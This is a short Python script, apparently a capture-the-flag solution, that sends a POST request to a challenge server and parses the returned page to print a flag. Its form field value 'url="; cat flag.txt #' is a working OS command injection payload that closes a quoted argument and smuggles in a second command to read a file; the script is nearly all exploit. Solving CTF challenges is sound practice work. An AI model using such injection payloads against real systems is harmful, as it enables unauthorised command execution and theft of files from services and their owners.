from requests import post
from bs4 import BeautifulSoup

if __name__ == '__main__':
    html = post('http://challenges.wsi.edu.pl:5016/', headers={'Content-Type': 'application/x-www-form-urlencoded'},
               data=b'url="; cat flag.txt #').content
    print(BeautifulSoup(html, 'html.parser').find(class_='text-break').text.split('\n')[-1])
